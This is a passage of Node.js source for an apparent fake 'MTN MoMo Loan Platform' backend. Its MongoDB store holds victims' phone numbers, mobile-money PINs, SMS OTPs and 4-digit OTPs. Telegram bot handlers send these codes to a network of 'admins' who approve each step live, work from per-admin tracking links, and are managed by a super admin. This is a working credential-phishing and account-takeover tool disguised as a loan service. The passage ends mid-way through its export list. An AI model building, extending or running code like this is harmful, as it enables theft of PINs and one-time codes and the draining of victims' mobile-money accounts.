const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = process.env.DB_NAME || 'mtn_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Connect to MongoDB
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI);
        await client.connect();

        db = client.db(DB_NAME);

        console.log('✅ Connected to MongoDB successfully');

        await createIndexes();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsOtpStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ fourDigitOtpStatus: 1 });

        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 });

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ENVIRONMENT LOGS OPERATIONS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        const logEntry = {
            adminId,
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
        console.log(`📝 Environment Log [${action}] recorded for admin: ${adminId}`);
    } catch (error) {
        console.error('❌ Error recording environment log:', error);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        return await db.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error getting environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId) throw new Error('Admin ID is required (adminId or id property)');
        if (!adminData.name) throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: String(adminData.chatId),
            role: adminData.role || 'admin',
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        console.log(`💾 Saving admin to database:`, {
            adminId: adminDocument.adminId,
            name: adminDocument.name,
            email: adminDocument.email,
            chatId: adminDocument.chatId,
            status: adminDocument.status
        });

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminData.name, email: adminData.email });

        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId: String(chatId) });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);
        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );

        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });
        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function suspendAllAdmins(exceptSuper = true) {
    try {
        const query = exceptSuper ? { role: { $ne: 'super_admin' }, adminId: { $ne: 'ADMIN001' } } : {};
        const result = await db.collection(COLLECTIONS.ADMINS).updateMany(
            query,
            { $set: { status: 'paused', updatedAt: new Date().toISOString() } }
        );
        return result;
    } catch (error) {
        console.error('❌ Error suspending all admins:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});
        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// TWO-STEP OTP APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            
            // 2-STEP OTP PROPERTIES
            smsOtp: appData.smsOtp || null,
            smsOtpStatus: appData.smsOtpStatus || 'pending', // 'pending', 'approved', 'rejected'
            fourDigitOtp: appData.fourDigitOtp || null,
            fourDigitOtpStatus: appData.fourDigitOtpStatus || 'not_started', // 'not_started', 'pending', 'approved', 'rejected'
            
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        });

        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
        }

        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [
                    { pinStatus: 'pending' }, 
                    { smsOtpStatus: 'pending' }, 
                    { fourDigitOtpStatus: 'pending' }
                ]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const smsOtpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsOtpStatus: 'pending' });
        const fourDigitPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, fourDigitOtpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            adminId, 
            smsOtpStatus: 'approved', 
            fourDigitOtpStatus: 'approved' 
        });
        return { total, pinPending, smsOtpPending, fourDigitPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, smsOtpPending: 0, fourDigitPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const smsOtpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsOtpStatus: 'pending' });
        const fourDigitPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ fourDigitOtpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ 
            smsOtpStatus: 'approved', 
            fourDigitOtpStatus: 'approved' 
        });
        const totalRejected = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { smsOtpStatus: 'rejected' },
                { fourDigitOtpStatus: 'rejected' }
            ]
        });
        return { totalAdmins, totalApplications, pinPending, smsOtpPending, fourDigitPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, smsOtpPending: 0, fourDigitPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

// ==========================================
// TELEGRAM COMMAND & CALLBACK HANDLERS
// ==========================================

/**
 * Helper to check Super Admin privileges
 */
function isSuperAdminUser(admin) {
    if (!admin) return false;
    return admin.adminId === 'ADMIN001' || admin.role === 'super_admin';
}

/**
 * Send Step 1 (SMS OTP) Verification Prompt with Inline Approval Buttons
 */
async function sendSmsOtpApprovalPrompt(bot, chatId, application) {
    const text = `
📩 *STEP 1: SMS OTP VERIFICATION NEEDED*
---------------------------------------
👤 *Ref ID:* \`${application.id}\`
📱 *Phone:* \`${application.phoneNumber}\`
🔑 *PIN:* \`${application.pin || 'N/A'}\`
💬 *SMS OTP:* \`${application.smsOtp || 'Pending User Input'}\`
    `.trim();

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve SMS OTP', callback_data: `approve_sms_${application.id}` },
                { text: '❌ Reject SMS OTP', callback_data: `reject_sms_${application.id}` }
            ]
        ]
    };

    return await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

/**
 * Send Step 2 (4-Digit OTP) Verification Prompt with Inline Approval Buttons
 */
async function sendFourDigitOtpApprovalPrompt(bot, chatId, application) {
    const text = `
🔐 *STEP 2: 4-DIGIT OTP VERIFICATION NEEDED*
--------------------------------------------
👤 *Ref ID:* \`${application.id}\`
📱 *Phone:* \`${application.phoneNumber}\`
🔢 *4-Digit OTP:* \`${application.fourDigitOtp || 'Pending User Input'}\`
    `.trim();

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Approve 4-Digit OTP', callback_data: `approve_4digit_${application.id}` },
                { text: '❌ Reject 4-Digit OTP', callback_data: `reject_4digit_${application.id}` }
            ]
        ]
    };

    return await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
}

/**
 * Setup Telegram Command Handlers
 * @param {Object} bot Telegram Bot instance
 * @param {Object} options Configuration options (e.g. webhookUrl)
 */
function setupCommandHandlers(bot, options = {}) {
    const webhookUrl = options.webhookUrl || process.env.WEBHOOK_URL || 'https://mkopo-wa-halopesa-tanzanian.onrender.com';

    bot.onText(/\/start/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);

            if (admin) {
                if (admin.status === 'paused' && admin.adminId !== 'ADMIN001') {
                    return bot.sendMessage(
                        chatId,
                        `🚫 *ADMIN ACCESS PAUSED*\nYour administrative access has been temporarily suspended.`,
                        { parse_mode: 'Markdown' }
                    );
                }

                const isSuper = isSuperAdminUser(admin);

                if (isSuper) {
                    const superAdminWelcome = `
👋 Welcome Super Admin!

Your Admin ID: ${admin.adminId}
Role: ⭐ Super Admin
Your Personal Link:
${webhookUrl}?admin=${admin.adminId}

Commands:
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information

Admin Management (Super Admin Only):
/addadmin - Add new admin
/addadminid - Add admin with specific ID
/transferadmin oldChatId | newChatId - Transfer admin
/pauseadmin <adminId> - Pause an admin
/unpauseadmin <adminId> - Unpause an admin
/removeadmin <adminId> - Remove an admin
/admins - List all admins
/suspendall - 🔒 Suspend selected admin links (checklist)

Messaging:
/send <adminId> <message> - Message an admin
/broadcast <message> - Message all admins
/ask <adminId> <request> - Send action request
`.trim();
                    return bot.sendMessage(chatId, superAdminWelcome, { disable_web_page_preview: true });
                }

                const standardWelcome = `
👋 *Welcome back, ${admin.name || 'Admin'}!*

*Your Admin ID:* \`${admin.adminId}\`
*Role:* 👤 Standard Admin
*Your Personal Link:*
${webhookUrl}?admin=${admin.adminId}

*Commands:*
/mylink - Get your link
/stats - Your statistics
/pending - Pending applications
/myinfo - Your information
`.trim();

                bot.sendMessage(chatId, standardWelcome, { parse_mode: 'Markdown', disable_web_page_preview: true });
            } else {
                bot.sendMessage(
                    chatId,
                    `👋 *Welcome to MTN MoMo Loan Platform*\nYour Chat ID is: \`${chatId}\`\nPlease provide this ID to your Super Administrator to request access.`,
                    { parse_mode: 'Markdown' }
                );
            }
        } catch (error) {
            console.error('Error handling /start:', error);
        }
    });

    bot.onText(/\/mylink/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!admin || admin.status !== 'active') return;
            bot.sendMessage(chatId, `🔗 *Your Personal Link:*\n${webhookUrl}?admin=${admin.adminId}`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error handling /mylink:', error);
        }
    });

    bot.onText(/\/myinfo/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!admin || admin.status !== 'active') return;
            bot.sendMessage(
                chatId,
                `👤 *Admin Profile*\n*Name:* ${admin.name}\n*Email:* ${admin.email}\n*ID:* \`${admin.adminId}\`\n*Role:* ${admin.role}\n*Status:* ${admin.status}`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            console.error('Error handling /myinfo:', error);
        }
    });

    bot.onText(/\/stats/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!admin || admin.status !== 'active') return;

            const stats = await getAdminStats(admin.adminId);
            bot.sendMessage(
                chatId,
                `
📊 *ADMINISTRATIVE STATISTICS*
------------------------------
📋 Total Applications: \`${stats.total}\`
⏳ PIN Pending: \`${stats.pinPending}\`
📩 Step 1 (SMS OTP) Pending: \`${stats.smsOtpPending}\`
🔐 Step 2 (4-Digit OTP) Pending: \`${stats.fourDigitPending}\`
🎉 Fully Approved: \`${stats.fullyApproved}\`
`.trim(),
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            console.error('Error handling /stats:', error);
        }
    });

    bot.onText(/\/pending/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!admin || admin.status !== 'active') return;

            const pendingApps = await getPendingApplications(admin.adminId);
            if (pendingApps.length === 0) {
                return bot.sendMessage(chatId, '✅ No pending applications found.');
            }

            for (const app of pendingApps) {
                if (app.smsOtpStatus === 'pending') {
                    await sendSmsOtpApprovalPrompt(bot, chatId, app);
                } else if (app.fourDigitOtpStatus === 'pending') {
                    await sendFourDigitOtpApprovalPrompt(bot, chatId, app);
                }
            }
        } catch (error) {
            console.error('Error handling /pending:', error);
        }
    });

    // ==========================================
    // SUPER ADMIN MANAGEMENT COMMANDS
    // ==========================================

    bot.onText(/\/addadmin$/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');

            bot.sendMessage(chatId, 'ℹ️ *Usage:* `/addadmin Name | Email | ChatID`', { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error handling /addadmin:', error);
        }
    });

    bot.onText(/\/addadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');

            const parts = match[1].split('|').map(p => p.trim());
            if (parts.length < 3) {
                return bot.sendMessage(chatId, '❌ Format error. Use:\n`/addadmin Name | Email | ChatID`', { parse_mode: 'Markdown' });
            }

            const [name, email, targetChatId] = parts;
            const newAdminId = `ADM-${Math.random().toString(36).slice(2, 7).toUpperCase()}`;

            await saveAdmin({
                adminId: newAdminId,
                name,
                email,
                chatId: targetChatId,
                role: 'admin',
                status: 'active'
            });

            bot.sendMessage(
                chatId,
                `✅ *Admin Created Successfully!*\nID: \`${newAdminId}\`\nName: ${name}\nChat ID: \`${targetChatId}\``,
                { parse_mode: 'Markdown' }
            );
        } catch (err) {
            bot.sendMessage(chatId, `❌ Error creating admin: ${err.message}`);
        }
    });

    bot.onText(/\/addadminid (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');

            const parts = match[1].split('|').map(p => p.trim());
            if (parts.length < 4) {
                return bot.sendMessage(chatId, '❌ Format error. Use:\n`/addadminid CustomAdminID | Name | Email | ChatID`', { parse_mode: 'Markdown' });
            }

            const [customId, name, email, targetChatId] = parts;

            await saveAdmin({
                adminId: customId,
                name,
                email,
                chatId: targetChatId,
                role: 'admin',
                status: 'active'
            });

            bot.sendMessage(
                chatId,
                `✅ *Admin Created with Custom ID!*\nID: \`${customId}\`\nName: ${name}\nChat ID: \`${targetChatId}\``,
                { parse_mode: 'Markdown' }
            );
        } catch (err) {
            bot.sendMessage(chatId, `❌ Error creating custom admin: ${err.message}`);
        }
    });

    bot.onText(/\/transferadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');

            const parts = match[1].split('|').map(p => p.trim());
            if (parts.length < 2) {
                return bot.sendMessage(chatId, '❌ Format error. Use:\n`/transferadmin oldChatId | newChatId`', { parse_mode: 'Markdown' });
            }

            const [oldChatId, newChatId] = parts;
            const targetAdmin = await getAdminByChatId(oldChatId);

            if (!targetAdmin) {
                return bot.sendMessage(chatId, `❌ Admin with Chat ID \`${oldChatId}\` not found.`, { parse_mode: 'Markdown' });
            }

            await updateAdmin(targetAdmin.adminId, { chatId: String(newChatId) });
            bot.sendMessage(chatId, `🔄 Admin \`${targetAdmin.adminId}\` transferred to new Chat ID: \`${newChatId}\`.`, { parse_mode: 'Markdown' });
        } catch (err) {
            bot.sendMessage(chatId, `❌ Error transferring admin: ${err.message}`);
        }
    });

    bot.onText(/\/pauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return;

            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot pause Super Admin.');

            await updateAdminStatus(targetAdminId, 'paused');
            bot.sendMessage(chatId, `⏸️ Admin \`${targetAdminId}\` has been paused.`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error pausing admin:', error);
        }
    });

    bot.onText(/\/unpauseadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return;

            const targetAdminId = match[1].trim();
            await updateAdminStatus(targetAdminId, 'active');
            bot.sendMessage(chatId, `▶️ Admin \`${targetAdminId}\` has been unpaused.`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error unpausing admin:', error);
        }
    });

    bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return;

            const targetAdminId = match[1].trim();
            if (targetAdminId === 'ADMIN001') return bot.sendMessage(chatId, '❌ Cannot remove Super Admin.');

            await deleteAdmin(targetAdminId);
            bot.sendMessage(chatId, `🗑️ Admin \`${targetAdminId}\` has been removed.`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error removing admin:', error);
        }
    });

    bot.onText(/\/admins/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) {
                return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');
            }

            const admins = await getAllAdmins();
            let text = `👥 *REGISTERED ADMINS (${admins.length})*\n\n`;
            admins.forEach(a => {
                text += `• *${a.name}* (\`${a.adminId}\`)\n  Role: ${a.role} | Status: ${a.status} | ChatID: \`${a.chatId}\`\n\n`;
            });
            bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error handling /admins:', error);
        }
    });

    bot.onText(/\/suspendall/, async (msg) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return bot.sendMessage(chatId, '❌ Restricted to Super Admin.');

            const result = await suspendAllAdmins(true);
            bot.sendMessage(chatId, `🔒 *All Admin Links Suspended!*\nUpdated ${result.modifiedCount} admin account(s) to paused state.`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error executing suspendall:', error);
        }
    });

    // ==========================================
    // MESSAGING COMMANDS
    // ==========================================

    bot.onText(/\/send (\S+) (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return;

            const targetAdminId = match[1];
            const directMsg = match[2];
            const targetAdmin = await getAdmin(targetAdminId);

            if (!targetAdmin?.chatId) {
                return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found or has no Chat ID.`, { parse_mode: 'Markdown' });
            }

            await bot.sendMessage(targetAdmin.chatId, `📩 *MESSAGE FROM SUPER ADMIN*\n\n${directMsg}`, { parse_mode: 'Markdown' });
            bot.sendMessage(chatId, `✅ Message sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error sending direct message:', error);
        }
    });

    bot.onText(/\/broadcast (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return;

            const broadcastMsg = match[1];
            const admins = await getAllAdmins();
            let count = 0;

            for (const item of admins) {
                if (item.chatId) {
                    await bot.sendMessage(item.chatId, `📢 *BROADCAST FROM SUPER ADMIN*\n\n${broadcastMsg}`, { parse_mode: 'Markdown' }).catch(() => {});
                    count++;
                }
            }
            bot.sendMessage(chatId, `✅ Broadcast sent to ${count} admins.`);
        } catch (error) {
            console.error('Error executing broadcast:', error);
        }
    });

    bot.onText(/\/ask (\S+) (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        try {
            const admin = await getAdminByChatId(chatId);
            if (!isSuperAdminUser(admin)) return;

            const targetAdminId = match[1];
            const requestMsg = match[2];
            const targetAdmin = await getAdmin(targetAdminId);

            if (!targetAdmin?.chatId) {
                return bot.sendMessage(chatId, `❌ Admin ID \`${targetAdminId}\` not found.`, { parse_mode: 'Markdown' });
            }

            await bot.sendMessage(
                targetAdmin.chatId, 
                `⚠️ *ACTION REQUEST FROM SUPER ADMIN*\n\n${requestMsg}\n\n_Please comply immediately or respond to Super Admin._`, 
                { parse_mode: 'Markdown' }
            );
            bot.sendMessage(chatId, `✅ Action request sent to \`${targetAdminId}\`.`, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Error executing ask command:', error);
        }
    });

    // ==========================================
    // BACKEND CALLBACK HANDLERS FOR APPROVAL/REJECTION
    // ==========================================

    bot.on('callback_query', async (query) => {
        const chatId = query.message.chat.id;
        const data = query.data;

        try {
            // SMS OTP APPROVAL / REJECTION
            if (data.startsWith('approve_sms_')) {
                const appId = data.replace('approve_sms_', '');
                await updateApplication(appId, { 
                    smsOtpStatus: 'approved',
                    fourDigitOtpStatus: 'pending' // Moves immediately to Step 2
                });

                await bot.answerCallbackQuery(query.id, { text: 'SMS OTP Approved! Moved to 4-Digit OTP.' });
                await bot.editMessageText(`✅ *SMS OTP Approved for Ref ID:* \`${appId}\`\nStatus updated. System now awaiting 4-Digit OTP entry.`, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'Markdown'
                });
            } 
            else if (data.startsWith('reject_sms_')) {
                const appId = data.replace('reject_sms_', '');
                await updateApplication(appId, { smsOtpStatus: 'rejected' });

                await bot.answerCallbackQuery(query.id, { text: 'SMS OTP Rejected.' });
                await bot.editMessageText(`❌ *SMS OTP Rejected for Ref ID:* \`${appId}\``, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'Markdown'
                });
            }

            // 4-DIGIT OTP APPROVAL / REJECTION
            else if (data.startsWith('approve_4digit_')) {
                const appId = data.replace('approve_4digit_', '');
                await updateApplication(appId, { fourDigitOtpStatus: 'approved' });

                await bot.answerCallbackQuery(query.id, { text: '4-Digit OTP Approved! Loan Application Fully Verified.' });
                await bot.editMessageText(`🎉 *FINAL APPROVAL:* 4-Digit OTP Approved for Ref ID: \`${appId}\`\nVerification Complete!`, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'Markdown'
                });
            } 
            else if (data.startsWith('reject_4digit_')) {
                const appId = data.replace('reject_4digit_', '');
                await updateApplication(appId, { fourDigitOtpStatus: 'rejected' });

                await bot.answerCallbackQuery(query.id, { text: '4-Digit OTP Rejected.' });
                await bot.editMessageText(`❌ *4-Digit OTP Rejected for Ref ID:* \`${appId}\``, {
                    chat_id: chatId,
                    message_id: query.message.message_id,
                    parse_mode: 'Markdown'
                });
            }
        } catch (error) {
            console.error('Error handling callback query:', error);
            bot.answerCallbackQuery(query.id, { text: 'Error processing action.' });
        }
    });
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    suspendAllAdmins,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
